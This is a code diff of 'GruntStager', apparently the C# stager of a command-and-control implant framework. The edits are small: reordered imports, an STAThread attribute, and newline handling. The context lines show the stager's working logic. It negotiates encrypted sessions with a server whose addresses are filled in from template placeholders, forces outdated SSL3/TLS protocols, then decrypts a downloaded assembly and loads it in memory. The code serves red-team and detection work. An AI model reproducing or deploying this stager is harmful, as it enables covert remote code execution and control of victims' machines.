@@ -1,14 +1,14 @@
 ﻿using System;
+using System.Net;
+using System.Linq;
+using System.Text;
+using System.Text.RegularExpressions;
 using System.IO;
 using System.IO.Pipes;
-using System.Linq;
 using System.IO.Compression;
-using System.Net;
-using System.Text;
 using System.Reflection;
 using System.Collections.Generic;
 using System.Security.Cryptography;
-using System.Text.RegularExpressions;
 
 namespace GruntStager
 {
@@ -18,6 +18,7 @@ namespace GruntStager
         {
             ExecuteStager();
         }
+        [STAThread]
         public static void Main(string[] args)
         {
             new GruntStager();
@@ -37,8 +38,8 @@ namespace GruntStager
                 // {{REPLACE_PROFILE_HTTP_HEADERS}}
                 List<string> ProfileHttpUrls = new List<string>();
                 // {{REPLACE_PROFILE_HTTP_URLS}}
-                string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}";
-                string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}";
+                string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
+                string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                 string CommType = @"{{REPLACE_COMM_TYPE}}";
                 bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                 bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
@@ -61,7 +62,6 @@ namespace GruntStager
                 byte[] RSAPublicKeyBytes = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));
                 byte[] EncryptedRSAPublicKey = SetupAESKey.CreateEncryptor().TransformFinalBlock(RSAPublicKeyBytes, 0, RSAPublicKeyBytes.Length);
                 byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
-
                 string Stage0Body = String.Format(MessageFormat, aGUID + GUID, "0", "", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));
 
                 ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
@@ -122,7 +122,6 @@ namespace GruntStager
                 SessionKey.Key = FullyDecrypted;
                 SessionKey.GenerateIV();
                 hmac = new HMACSHA256(SessionKey.Key);
-
                 byte[] challenge1 = new byte[4];
                 RandomNumberGenerator rng = RandomNumberGenerator.Create();
                 rng.GetBytes(challenge1);
@@ -188,7 +187,6 @@ namespace GruntStager
                 hash64str = parsed[5];
                 messageBytes = Convert.FromBase64String(message64str);
                 if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
-
                 SessionKey.IV = Convert.FromBase64String(iv64str);
                 byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                 Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
